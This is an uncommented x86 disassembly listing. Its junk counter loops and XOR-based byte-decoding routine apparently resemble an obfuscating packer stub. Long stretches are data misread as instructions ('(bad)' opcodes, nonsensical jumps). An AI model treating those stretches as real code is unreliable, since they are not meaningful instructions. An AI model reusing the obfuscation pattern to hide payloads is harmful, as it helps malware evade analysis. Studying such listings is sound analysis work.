  40f36a:	sub    ebx,DWORD PTR [edi+ecx*4+0x3d11d915]
  40f371:	mov    ebp,0x7cbf8323
  40f376:	pop    edi
  40f377:	daa    
  40f378:	popa   
  40f379:	push   esi
  40f37a:	es xchg dl,ah
  40f37d:	jae    0x40f30e
  40f37f:	dec    esi
  40f380:	mov    WORD PTR [eax+edi*4],fs
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	aaa    
  40f38b:	inc    ebx
  40f38c:	add    BYTE PTR [eax],al
  40f38e:	add    BYTE PTR [eax],al
  40f390:	add    BYTE PTR [ebx],dh
  40f392:	leave  
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x7efa54c7]
  40f540:	nop
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	add    bl,BYTE PTR [eax]
  40f54b:	(bad)  
  40f54c:	into   
  40f54d:	mov    al,0x36
  40f54f:	scas   al,BYTE PTR es:[edi]
  40f550:	cmp    al,0x0
  40f552:	cli    
  40f553:	ins    BYTE PTR es:[edi],dx
  40f554:	call   0xa408:0x25c3847d
  40f55b:	and    eax,0x1d9cee8d
  40f560:	cld    
  40f561:	ficomp DWORD PTR [ebx]
  40f563:	popf   
  40f564:	and    BYTE PTR [ecx-0x24bc8671],cl
  40f56a:	xor    ebp,DWORD PTR ds:0x33c35aad
  40f570:	xlat   BYTE PTR ds:[ebx]
  40f571:	shl    BYTE PTR [ecx],1
  40f573:	and    bx,WORD PTR [eax]
  40f576:	popa   
  40f577:	inc    edi
  40f578:	loopne 0x40f5c7
  40f57a:	scas   eax,DWORD PTR es:[edi]
  40f57b:	out    0x3b,al
  40f57d:	dec    ecx
  40f57e:	inc    edi
  40f57f:	mov    ch,dl
  40f581:	test   al,0xad
  40f583:	add    BYTE PTR [eax+0x19],ah
  40f586:	(bad)  [esi-0x57]
  40f589:	lea    esp,[edx+eax*8]
  40f58c:	push   eax
  40f58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f58e:	or     al,0xb8
  40f590:	dec    ecx
  40f591:	pop    esp
  40f592:	jmp    0xa2afa95c
  40f597:	xchg   esi,eax
  40f598:	scas   eax,DWORD PTR es:[edi]
  40f599:	jmp    0x5b2e:0xe023aa54
  40f5a0:	nop
  40f5a1:	push   0xc58f199f
  40f5a6:	adc    al,0xb4
  40f5a8:	sbb    BYTE PTR [ecx-0x28],dh
  40f5ab:	or     DWORD PTR [edx],eax
  40f5ad:	sub    bh,dh
  40f5af:	mov    DWORD PTR [ebx],ecx
  40f5b1:	dec    edx
  40f5b2:	adc    al,0x96
  40f5b4:	ret    0xbe52
  40f5b7:	mov    ds:0x4839cd63,eax
  40f5bc:	xchg   esp,eax
  40f5bd:	in     al,0xb2
  40f5bf:	cli    
  40f5c0:	test   al,0x9f
  40f5c2:	sub    ah,bh
  40f5c4:	or     eax,0x11e9960c
  40f5c9:	cmp    ebx,DWORD PTR [ecx+0x53ee76e5]
  40f5cf:	cmc    
  40f5d0:	ret    
  40f5d1:	stc    
  40f5d2:	push   esi
  40f5d3:	retf   0xc161
  40f5d6:	aad    0xaa
  40f5d8:	push   0xbbbb219
  40f5dd:	enter  0xf62d,0x0
  40f5e1:	test   BYTE PTR [eax-0x48],0x79
  40f5e5:	xchg   edx,eax
  40f5e6:	mov    dl,0x1a
  40f5e8:	pop    esp
  40f5e9:	jge    0x40f63d
  40f5eb:	imul   esi,DWORD PTR [ebx],0xd
  40f5ee:	pop    ss
  40f5ef:	mov    eax,0x57b20424
  40f5f4:	dec    ebx
  40f5f5:	leave  
  40f5f6:	mov    edi,0x86c02e5e
  40f5fb:	jbe    0x40f5d1
  40f5fd:	jmp    0xe977e2e8
  40f602:	cmp    ah,BYTE PTR [edx-0x7a66a32c]
  40f608:	pop    ebp
  40f609:	inc    ecx
  40f60a:	xor    BYTE PTR [ebx-0x69],bh
  40f60d:	fdivr  DWORD PTR ds:0x380d268d
  40f613:	push   edx
  40f614:	push   ds
  40f615:	dec    esp
  40f616:	jp     0x40f67c
  40f618:	out    dx,al
  40f619:	bound  ebp,QWORD PTR [esi]
  40f61b:	out    0xcf,al
  40f61d:	mov    esp,0x33c01fe9
  40f622:	push   esi
  40f623:	dec    ebx
  40f624:	or     al,0x0
  40f626:	adc    BYTE PTR [esi-0x2cd828c3],bh
  40f62c:	fs clc 
  40f62e:	iret   
  40f62f:	jns    0x40f68e
  40f631:	mov    esi,0x6ec089ba
  40f636:	fwait
  40f637:	(bad)  
  40f638:	fsub   st(1),st
  40f63a:	xor    eax,0x913f7670
  40f63f:	adc    esi,ebp
  40f641:	pop    ebp
  40f642:	pop    eax
  40f643:	or     esp,esp
  40f645:	xchg   esi,eax
  40f646:	jmp    DWORD PTR [eax-0x59]
  40f649:	dec    esp
  40f64a:	cmp    DWORD PTR [esi],0x9892d0ef
  40f650:	jle    0x40f6c3
  40f652:	rol    BYTE PTR [ebx+0x5eb30d1f],1
  40f658:	or     DWORD PTR [ebp+esi*1-0x5e],edx
  40f65c:	pop    eax
  40f65d:	arpl   WORD PTR [ebx],ax
  40f65f:	cmp    DWORD PTR [edx],edx
  40f661:	xor    eax,0x4c323811
  40f666:	inc    DWORD PTR [edx+0x3d]
  40f669:	inc    edi
  40f66a:	add    DWORD PTR [edx],0xe
  40f66d:	fistp  DWORD PTR [esi+edx*8-0x2d50e0c1]
  40f674:	pop    eax
  40f675:	lods   eax,DWORD PTR ds:[esi]
  40f676:	mov    al,ds:0xf53e348
  40f67b:	retf   
  40f67c:	or     al,BYTE PTR cs:[esi]
  40f67f:	xchg   edx,eax
  40f680:	push   ecx
  40f681:	mov    eax,ds:0x36011ded
  40f686:	xchg   ecx,eax
  40f687:	setbe  BYTE PTR [esi-0x46]
  40f68b:	lds    edi,FWORD PTR [eax]
  40f68d:	sti    
  40f68e:	jmp    0x40f667
  40f690:	clc    
  40f691:	and    esi,DWORD PTR [edx]
  40f693:	and    bl,ah
  40f695:	jmp    0x983fc358
  40f69a:	aaa    
  40f69b:	ret    
  40f69c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f69d:	(bad)  
  40f69e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f69f:	pop    ecx
  40f6a0:	fldenv [ecx+edi*2-0x14f15f6e]
  40f6a7:	and    BYTE PTR [ebx+ecx*1],dh
  40f6aa:	add    ah,bl
  40f6ac:	enter  0x1e5e,0xb8
  40f6b0:	mov    bl,0x73
  40f6b2:	push   ecx
  40f6b3:	mov    bh,cl
  40f6b5:	push   ecx
  40f6b6:	mov    ecx,0x44ce2168
  40f6bb:	push   0xccfb9af7
  40f6c0:	xor    BYTE PTR [ecx-0x5bc57e4b],bh
  40f6c6:	out    dx,al
  40f6c7:	xor    ebp,DWORD PTR [edi]
  40f6c9:	faddp  st(3),st
  40f6cb:	icebp  
  40f6cc:	ds push ds
  40f6ce:	inc    esp
  40f6d0:	call   0xb3bffddc
  40f6d5:	jnp    0x40f6a4
  40f6d7:	inc    edi
  40f6d8:	jae    0x40f6cc
  40f6da:	add    BYTE PTR [edi+0x32],0x79
  40f6de:	inc    bp
  40f6e0:	adc    al,BYTE PTR [edx]
  40f6e2:	or     ebp,DWORD PTR [ebx]
  40f6e4:	and    eax,0x9b85cbd9
  40f6e9:	gs lahf 
  40f6eb:	cmova  esp,edi
  40f6ee:	adc    BYTE PTR [ecx+ebp*2-0x6e],ch
  40f6f2:	sbb    al,0x1f
  40f6f4:	push   eax
  40f6f5:	xchg   ebp,ebp
  40f6f7:	add    DWORD PTR [ecx-0x46],edi
  40f6fa:	ds mov al,0x53
  40f6fd:	mov    al,0x29
  40f6ff:	mov    edx,0x44922d7e
  40f704:	ret    
  40f705:	adc    DWORD PTR ds:0x8f880add,ebp
  40f70b:	xor    eax,0x53873630
  40f710:	push   es
  40f711:	aaa    
  40f712:	nop
  40f713:	cdq    
  40f714:	ss in  eax,dx
  40f716:	dec    ebp
  40f717:	std    
  40f718:	sub    esp,ebp
  40f71a:	mov    ss,WORD PTR [ebx]
  40f71c:	call   eax
  40f71e:	ds inc ecx
  40f720:	mov    edi,DWORD PTR [esp+edi*1]
  40f723:	inc    esp
  40f724:	out    0x5f,al
  40f726:	outs   dx,BYTE PTR ds:[esi]
  40f727:	into   
  40f728:	(bad)  
  40f729:	inc    al
  40f72b:	add    al,0xbb
  40f72d:	or     al,0x9a
  40f72f:	stc    
  40f730:	mov    BYTE PTR es:[esi+0x7c689151],bh
  40f737:	add    eax,0x2b39769
  40f73c:	iret   
  40f73d:	pop    esi
  40f73e:	push   es
  40f73f:	loopne 0x40f735
  40f741:	mov    al,0xd4
  40f743:	addr16 pop ds
  40f745:	xchg   ebp,eax
  40f746:	or     al,0xb4
  40f748:	pop    edx
  40f749:	enter  0xf4fc,0x48
  40f74d:	adc    al,0x6b
  40f74f:	ds sub al,0x12
  40f752:	mov    al,ds:0xfb635a3d
  40f757:	adc    ebx,DWORD PTR [edx+esi*8]
  40f75a:	cwde   
  40f75b:	cmc    
  40f75c:	ds or  al,0x1c
  40f75f:	mov    BYTE PTR [edx+edi*4],bl
  40f762:	nop
  40f763:	inc    esp
  40f764:	mov    ecx,0x2fed95f7
  40f769:	call   0x30747116
  40f76e:	mov    ebx,ebx
  40f770:	push   eax
  40f771:	xor    eax,ecx
  40f773:	(bad)  
  40f774:	xchg   edx,eax
  40f775:	int    0x63
  40f777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f778:	cmp    al,0xa9
  40f77a:	mov    bl,0x79
  40f77c:	mov    dh,BYTE PTR [edx-0x39]
  40f77f:	rcr    BYTE PTR [esp+ebx*1],0x72
  40f783:	clc    
  40f784:	mov    ebx,0x3e696fa5
  40f789:	sub    ecx,esi
  40f78b:	popa   
  40f78c:	stos   DWORD PTR es:[edi],eax
  40f78d:	push   ebx
  40f78e:	jmp    0xe1e112fb
  40f793:	push   esi
  40f794:	hlt    
  40f795:	inc    ebp
  40f796:	adc    ah,BYTE PTR [eax]
  40f798:	lock sbb BYTE PTR [edx+0x5f8d82eb],0x8a
  40f7a0:	sub    DWORD PTR [esi],esp
  40f7a2:	sbb    al,0x31
  40f7a4:	push   ds
  40f7a5:	and    DWORD PTR [esi],0xffffff89
  40f7a8:	and    eax,DWORD PTR ds:0xf5aa0b12
  40f7ae:	jae    0x40f7d8
  40f7b0:	cmp    eax,0x5d163693
  40f7b5:	mov    al,ds:0x507e5c6
  40f7ba:	inc    edi
  40f7bb:	outs   dx,DWORD PTR ds:[esi]
  40f7bc:	jge    0x40f741
  40f7be:	cmp    al,0xe7
  40f7c0:	imul   dl
  40f7c2:	jmp    0x65dc:0xfa8524e3
  40f7c9:	mov    ch,0x59
  40f7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7cc:	cs jle 0x40f761
  40f7cf:	cdq    
  40f7d0:	add    DWORD PTR [ecx],esi
  40f7d2:	ss push ebp
  40f7d4:	sub    eax,0xe18aacf0
  40f7d9:	adc    ebp,DWORD PTR [esi+0x73af6f86]
  40f7df:	loop   0x40f7f1
  40f7e1:	fsub   QWORD PTR [eax]
  40f7e3:	arpl   WORD PTR [edx],bx
  40f7e5:	xchg   ebp,eax
  40f7e6:	ins    BYTE PTR es:[edi],dx
  40f7e7:	ins    DWORD PTR es:[edi],dx
  40f7e8:	mov    al,0xc5
  40f7ea:	das    
  40f7eb:	mov    ebp,0x22440ba5
  40f7f0:	pop    ds
  40f7f1:	xchg   edi,ebx
  40f7f3:	sbb    al,0x5d
  40f7f5:	hlt    
  40f7f6:	jg     0x40f81a
  40f7f8:	sub    esi,DWORD PTR [edi]
  40f7fa:	pop    ebp
  40f7fb:	fwait
  40f7fc:	pop    esi
  40f7fd:	jg     0x40f7d4
  40f7ff:	cdq    
  40f800:	ffree  st(3)
  40f802:	lahf   
  40f803:	push   esi
  40f804:	jnp    0x40f7da
  40f806:	fucomip st,st(3)
  40f808:	mov    ds:0xaa5e62f7,al
  40f80d:	jb     0x40f860
  40f80f:	iret   
  40f810:	adc    dl,BYTE PTR ds:0x831df7c4
  40f816:	jecxz  0x40f7b1
  40f818:	je     0x40f7c9
  40f81a:	(bad)  
  40f81b:	push   0x65
  40f81d:	fidivr DWORD PTR [ebp+0x6c]
  40f820:	sahf   
  40f821:	call   0xd8242db5
  40f826:	cmp    al,0xa0
  40f828:	lds    edi,FWORD PTR [edi+0x61]
  40f82b:	ds stos DWORD PTR es:[edi],eax
  40f82d:	xlat   BYTE PTR ds:[ebx]
  40f82e:	enter  0xad4d,0xb7
  40f832:	je     0x40f830
  40f834:	mov    eax,ds:0xefcd66cc
  40f839:	fs out 0x98,al
  40f83c:	mov    gs,esp
  40f83e:	and    DWORD PTR [ebx-0x1e081f1f],ebx
  40f844:	cs lock push ebx
  40f847:	and    ch,BYTE PTR [ecx-0x1f]
  40f84a:	jle    0x40f87f
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xb7dfb63f
  40f897:	add    eax,0x7e7eabd2
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	inc    ebp
  40f8a1:	or     ebx,DWORD PTR [eax-0x46]
  40f8a4:	jp     0x40f8f2
  40f8a6:	add    DWORD PTR [ecx+ecx*4+0x55],ebx
  40f8aa:	jne    0x40f8a2
  40f8ac:	or     ecx,DWORD PTR [edx+0x22]
  40f8af:	mov    DWORD PTR [ebx+0x128c4508],eax
  40f8b5:	jg     0x40f92b
  40f8b7:	test   eax,0x9fbde20e
  40f8bc:	cmc    
  40f8bd:	mov    WORD PTR [eax+0x437d043e],?
  40f8c3:	push   esi
  40f8c4:	ret    0x873e
  40f8c7:	call   0x952f9840
  40f8cc:	xchg   edx,eax
  40f8cd:	dec    eax
  40f8ce:	mov    bh,0x99
  40f8d0:	into   
  40f8d1:	mov    esi,0xa22e106e
  40f8d6:	scas   al,BYTE PTR es:[edi]
  40f8d7:	dec    ebx
  40f8d8:	rol    esp,cl
  40f8da:	add    ecx,ebp
  40f8dc:	mov    edx,es
  40f8de:	(bad)  
  40f8df:	leave  
  40f8e0:	mov    ss,WORD PTR [ebx-0x26]
  40f8e3:	cwde   
  40f8e4:	lds    ecx,FWORD PTR [esi]
  40f8e6:	fisubr DWORD PTR [esi+0x5e457dda]
  40f8ec:	pop    edx
  40f8ed:	and    edx,DWORD PTR [edx]
  40f8ef:	fild   WORD PTR [esp+ebx*1-0x5c]
  40f8f3:	xor    DWORD PTR [eax-0x7c50526d],edx
  40f8f9:	ret    
  40f8fa:	mov    edx,0x35193adc
  40f8ff:	in     eax,dx
  40f900:	or     bl,BYTE PTR [ecx+0x3c]
  40f903:	cmp    dh,BYTE PTR [edx-0x63]
  40f906:	enter  0xb376,0x9a
  40f90a:	push   esp
  40f90b:	ss push edi
  40f90d:	add    DWORD PTR [ebp-0x7f],esi
  40f910:	out    dx,eax
  40f911:	mov    eax,ds:0xbf293eac
  40f916:	iret   
  40f917:	jno    0x40f8d8
  40f919:	(bad)  
  40f91b:	push   ecx
  40f91c:	ins    DWORD PTR es:[edi],dx
  40f91d:	jne    0x40f932
  40f91f:	cmp    al,0xe3
  40f921:	or     ebp,edx
  40f923:	mov    edx,0x50ada5a
  40f928:	push   cs
  40f929:	sar    BYTE PTR [ebx-0x666c39f8],cl
  40f92f:	shl    BYTE PTR [esi-0x8aab211],cl
  40f935:	and    BYTE PTR [ebx-0x1c1f0087],bl
  40f93b:	rcr    BYTE PTR [ecx-0x426be608],0xc0
  40f942:	adc    BYTE PTR [esi+0x6686ec6f],0x36
  40f949:	inc    eax
  40f94a:	mov    esp,0x33ff9a00
  40f94f:	in     al,dx
  40f950:	mov    ds:0x1c6048de,al
  40f955:	jp     0x40f986
  40f957:	mov    dh,0xe9
  40f959:	push   ebx
  40f95a:	push   ebp
  40f95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f95c:	xchg   edx,eax
  40f95d:	in     al,0x18
  40f95f:	stc    
  40f960:	mov    bl,BYTE PTR [esi]
  40f962:	adc    BYTE PTR [edi-0x5f],dh
  40f965:	xchg   ebp,eax
  40f967:	fisttp QWORD PTR [esi*8-0x76202f10]
  40f96e:	pop    edi
  40f96f:	mov    WORD PTR [ebp+0x1f603d39],cs
  40f975:	mov    edi,0xe23be62c
  40f97a:	dec    ecx
  40f97b:	dec    ebp
  40f97c:	mov    esp,0x88300d8f
  40f981:	adc    bh,al
  40f983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f984:	(bad)  
  40f985:	push   eax
  40f986:	push   edi
  40f987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f988:	outs   dx,DWORD PTR ds:[esi]
  40f989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f98a:	add    BYTE PTR [edx-0x68],cl
  40f98d:	xchg   esp,eax
  40f98f:	jmp    0x40f942
  40f991:	(bad)  
  40f992:	call   DWORD PTR [edx+0x2c373e44]
  40f998:	xor    DWORD PTR [ecx+0x1105ff78],eax
  40f99e:	jne    0x40f930
  40f9a0:	out    0x97,al
  40f9a2:	cmp    al,0xaa
  40f9a4:	aam    0x56
  40f9a6:	fisub  WORD PTR [edx]
  40f9a8:	(bad)  
  40f9a9:	sti    
  40f9aa:	test   eax,0x8a5486d3
  40f9af:	loope  0x40f9e7
  40f9b1:	sahf   
  40f9b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9b3:	loopne 0x40f95f
  40f9b5:	add    BYTE PTR [esp+ebp*1+0x1fa6773e],bl
  40f9bc:	dec    ebp
  40f9bd:	scas   al,BYTE PTR es:[edi]
  40f9be:	hlt    
  40f9bf:	gs inc eax
  40f9c1:	lds    esp,FWORD PTR [eax]
  40f9c3:	jb     0x40f99b
  40f9c5:	sbb    BYTE PTR [edi+esi*8-0x6c418d17],0x96
  40f9cd:	jecxz  0x40f999
  40f9cf:	mov    ss,WORD PTR gs:[esp+ebp*4]
  40f9d3:	mov    cx,0x8f40
  40f9d7:	mov    ebp,0xafc9f9c9
  40f9dc:	leave  
  40f9dd:	adc    BYTE PTR [edi-0x60],bl
  40f9e0:	push   ecx
  40f9e1:	inc    ecx
  40f9e2:	stos   DWORD PTR es:[edi],eax
  40f9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9e4:	push   cs
  40f9e5:	in     eax,0x24
  40f9e7:	mov    es,WORD PTR [esi-0x4cfe0d06]
  40f9ed:	stos   BYTE PTR es:[edi],al
  40f9ee:	add    eax,0xc9156e92
  40f9f3:	repz mov al,ds:0xae3d8f8e
  40f9f9:	loopne 0x40f9c1
  40f9fb:	retf   0x4773
  40f9fe:	xchg   edi,eax
  40f9ff:	stc    
  40fa00:	lahf   
  40fa01:	fwait
  40fa02:	inc    edi
  40fa03:	sahf   
  40fa04:	or     edi,edi
  40fa06:	rcl    DWORD PTR [edi],1
  40fa08:	push   cs
  40fa09:	xor    DWORD PTR [ebx+0x1e],ebx
  40fa0c:	or     DWORD PTR [edx-0x30],esi
  40fa0f:	sbb    esi,eax
  40fa11:	clc    
  40fa12:	sbb    edx,esi
  40fa14:	lds    eax,FWORD PTR [esi]
  40fa16:	(bad)  
  40fa18:	(bad)  
  40fa19:	jmp    0x40f9f3
  40fa1b:	jp     0x40f9f2
  40fa1d:	adc    eax,0xfd379647
  40fa22:	enter  0xbf27,0x9c
  40fa26:	popa   
  40fa27:	jle    0x40fa0f
  40fa29:	pop    edi
  40fa2a:	mov    ebp,0x63497d17
  40fa2f:	adc    al,BYTE PTR [ecx]
  40fa31:	stc    
  40fa32:	arpl   si,si
  40fa34:	or     ebp,edx
  40fa36:	in     eax,dx
  40fa37:	cmp    dh,BYTE PTR [ebp-0x66cfcd68]
  40fa3d:	inc    ebx
  40fa3e:	test   eax,0x7d05ce60
  40fa43:	mov    eax,0x337454c6
  40fa48:	sti    
  40fa49:	mov    edx,0x7923f935
  40fa4e:	pop    ecx
  40fa4f:	cmp    al,BYTE PTR [ebx-0x40bf2b04]
  40fa55:	je     0x40fa9c
  40fa57:	test   BYTE PTR [ebx-0x50],ah
  40fa5a:	ins    DWORD PTR es:[edi],dx
  40fa5b:	aaa    
  40fa5c:	add    BYTE PTR [esi+edx*8-0x7b3b827a],bl
  40fa63:	sub    al,BYTE PTR [ecx+edi*8-0x44]
  40fa67:	fistp  DWORD PTR [ecx-0x41]
  40fa6a:	pop    ebx
  40fa6b:	aaa    
  40fa6c:	fwait
  40fa6d:	ins    BYTE PTR es:[edi],dx
  40fa6e:	in     al,dx
  40fa6f:	repnz xor ebp,DWORD PTR [esi+0x3f0a3a3c]
  40fa76:	xchg   BYTE PTR [ebx],dh
  40fa78:	dec    ecx
  40fa79:	cld    
  40fa7a:	mov    ds:0x82943dd6,eax
  40fa7f:	les    esi,FWORD PTR [esi]
  40fa81:	dec    eax
  40fa82:	sbb    al,0xfc
  40fa84:	jmp    0x40faa7
  40fa86:	stc    
  40fa87:	mov    esi,0xdbfa09c1
  40fa8c:	cld    
  40fa8d:	sbb    edi,DWORD PTR [edx]
  40fa8f:	out    dx,eax
  40fa90:	dec    edx
  40fa91:	daa    
  40fa92:	stos   DWORD PTR es:[edi],eax
  40fa93:	xor    BYTE PTR [ebx-0x1c],bh
  40fa96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa97:	xchg   esi,eax
  40fa98:	jns    0x40fb11
  40fa9a:	pusha  
  40fa9b:	or     BYTE PTR [eax],bh
  40fa9d:	outs   dx,BYTE PTR ds:[esi]
  40fa9e:	pop    es
  40fa9f:	cli    
  40faa0:	jno    0x40fa67
  40faa2:	pop    esi
  40faa3:	(bad)  
  40faa4:	gs lock push ss
  40faa7:	xchg   ebp,eax
  40faa8:	cmp    ecx,DWORD PTR es:[edi+0x34]
  40faac:	je     0x40fad0
  40faae:	push   ebp
  40faaf:	cmc    
  40fab0:	(bad)  
  40fab1:	pop    esp
  40fab2:	sbb    al,0x73
  40fab4:	cli    
  40fab5:	sar    BYTE PTR [edi-0x7776c9a7],cl
  40fabb:	dec    ebx
  40fabc:	mov    ecx,0xe0d53a69
  40fac1:	in     al,dx
  40fac2:	jp     0x40fab2
  40fac4:	sub    ch,bh
  40fac6:	dec    eax
  40fac7:	sar    BYTE PTR [ecx-0x2],1
  40faca:	xchg   esi,eax
  40facb:	fild   QWORD PTR [esi]
  40facd:	leave  
  40face:	daa    
  40facf:	mov    ss,WORD PTR [edx+0x63665a58]
  40fad5:	scas   al,BYTE PTR es:[edi]
  40fad6:	mov    ch,0xf2
  40fad8:	cmp    eax,0xbaa48195
  40fadd:	jmp    FWORD PTR [eax+0x14]
  40fae0:	sbb    al,0x85
  40fae3:	push   es
  40fae4:	xlat   BYTE PTR ds:[ebx]
  40fae5:	mov    BYTE PTR [ebp-0x559b7e18],bl
  40faeb:	mov    ds:0xf5cc389e,al
  40faf0:	jno    0x40fb02
  40faf2:	mov    ebp,eax
  40faf4:	push   ebp
  40faf5:	xor    eax,esi
  40faf7:	mov    edi,edx
  40faf9:	sub    al,0x59
  40fafb:	sub    BYTE PTR [ecx-0x3c],cl
  40fafe:	mov    ch,0x4e
  40fb00:	retf   
  40fb01:	adc    DWORD PTR [edx+0x16],esp
  40fb04:	add    BYTE PTR [ebp+0x1b],dl
  40fb07:	pushf  
  40fb08:	mov    ds,WORD PTR [eax+0x3453ad4b]
  40fb0e:	fmul   DWORD PTR [ebp-0x7b]
  40fb11:	sbb    esi,eax
  40fb13:	sub    eax,0x1b195daf
  40fb18:	pop    ecx
  40fb19:	push   ecx
  40fb1a:	in     eax,dx
  40fb1b:	out    dx,eax
  40fb1c:	push   0x1d333748
  40fb21:	add    eax,0x3495c01c
  40fb26:	xor    BYTE PTR [ecx],0x59
  40fb29:	fwait
  40fb2a:	adc    DWORD PTR [esi-0x53],edi
  40fb2d:	jb     0x40fb22
  40fb2f:	jno    0x40fae3
  40fb31:	out    dx,al
  40fb32:	sub    al,0xa9
  40fb34:	mov    esp,0x7e4fe689
  40fb39:	inc    esp
  40fb3a:	xchg   esp,eax
  40fb3b:	daa    
  40fb3c:	pop    ds
  40fb3d:	or     eax,0x6ed037e9
  40fb42:	or     edx,DWORD PTR [edi-0x3e]
  40fb45:	mov    bl,0xb
  40fb47:	jnp    0x40fad3
  40fb49:	cs mov bl,0x36
  40fb4c:	nop
  40fb4d:	fs mov ebp,0xe98e79b1
  40fb53:	xor    al,0xc8
  40fb55:	in     al,dx
  40fb56:	mov    ds:0xd02f935,eax
